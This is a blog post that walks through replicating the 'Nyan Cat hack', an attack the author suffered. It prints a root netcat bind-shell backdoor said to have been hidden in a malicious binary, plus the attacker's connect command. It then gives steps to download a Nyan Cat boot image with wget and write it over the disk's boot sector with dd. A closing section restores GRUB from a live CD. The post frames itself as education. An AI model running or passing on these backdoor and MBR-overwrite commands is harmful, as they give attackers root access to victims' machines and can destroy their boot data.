---
layout: post
title: Nyan Cat Hack - How To
---

A writeup of how the Nyan Cat hack works.

<center>
<img src="/assets/nyan.png" alt="nyan" width="100%"/>
</center>


After the <a href="/2012/10/01/nyan_story.html">Nyan Cat Hack</a>, I wanted to learn how it was executed to get a better idea of what happened so that I could protect myself. This post is a simple description of how to replicate the hack. This is divided into two parts, the backdoor and the bootloader. Disclaimer: this is meant for education only. Do not illegally hack into other machines.

## The Backdoor

CowCli, the malicious binary, had a simple set of NetCat commands embedded within it that allowed terminal access into the victim’s machine. When CowCli is run, it behaves as intended along with executing the following code on the victim’s computer: This code can be executed stand alone from the command line.

```
sudo rm /etc/alternatives/nc && sudo ln -s /bin/nc.traditional /etc/alternatives/nc
sudo nc -l -p 40 -e /bin/sh 
```

The first command here is replacing the default NetCat with nc.traditional. This command might be optional, though was necessary for me to replicate the attack. Note that on OpenBSD machines, nc.openbsd should be used in place of nc.traditional. The second command is the true backdoor. This tells the victim’s machine to listen for traffic on port 40 and return a shell to the first connection to that port. The returned shell will have privileges equal to that of the NetCat process, so executing the second command with sudo will return a root shell.

Once the above commands have been run on the victim’s machine, the attacker can execute this bit of code:

`nc {victim's local IP address} 40`

This will simply connect to the port that the previous NetCat commands opened. Once executed, you will be able to use the connection as an interactive shell into the victim’s computer. This most likely will only work over a local network. To perform this attack on a remote user, that user’s router would need to be reconfigured so that port 40 traffic is directed to the target machine.

## The Bootloader

Once you have root access to a remote computer, you can do anything you want with it. My attacker chose to overwrite my bootloader with his own bootloader code. The bootloader is a small piece of code that the BIOS executes to boot into an operating system. I recommend that if you wish to replicate this attack, to do so in a virtual machine. This attack uses the dd command, and a mistake here can result in lost data or lock you out of your machine.

To overwrite the bootloader of the victim’s machine with Nyan Cat, follow these steps from the victims machine.

```
wget https://minemu.org/nyanmbr/nyan.mbr
dd if=nyan.mbr of=/dev/sda
```

The first command here is retrieving the Nyan Cat bootloader. The second command is overwriting the first sector of the primary device. The first sector is where the BIOS looks to load an operating system. This command is essentially saying to replace the first X bits of the hard disk with nyan.mbr, where X is the length of nyan.mbr in bits. if=input file, of=output file.

Now, give the machine a restart and check out how it behaves!!

To recover the bootloader, continue on. The first thing we need to do is boot from a LiveCD. For Ubuntu, this is as simple as popping in the disk or .iso file used to install the machine. Reboot the victim’s machine, press the key to open the BIOS menu, and find the option that lets you boot from the CD rom drive. You can either boot into the operating system directly off the CD or sometimes there’s an option to load up a terminal without booting all the way into the OS. Either way, get to a terminal window and follow the rest of the instructions. I learned the next steps here.

```
mkdir /mnt/myroot
sudo mount /dev/sda1 /mnt/myroot
sudo mount --bind /dev /mnt/myroot/dev
sudo mount --bind /proc /mnt/myroot/proc
sudo mount --bind  /sys /mnt/myroot/sys
sudo chroot /mnt/myroot
sudo grub-install /dev/sda
```

These steps are recreating a clean root in your machine. Steps 3,4,5 are copying the LiveCD’s dev, proc, and sys data into a new root. The chroot command locks the user into /mnt/myroot, such that from the user’s perspective /mnt/myroot becomes the root of the file system. Finally, grub-install replaces the nyan bootloader with the grub bootloader, the stock Ubuntu bootloader. After executing these commands, issue another restart on the machine and make sure you boot from disk (instead of the LiveCD again). If performed correctly, this should boot you back into your operating system, with all your data in tact.

Happy hacking!


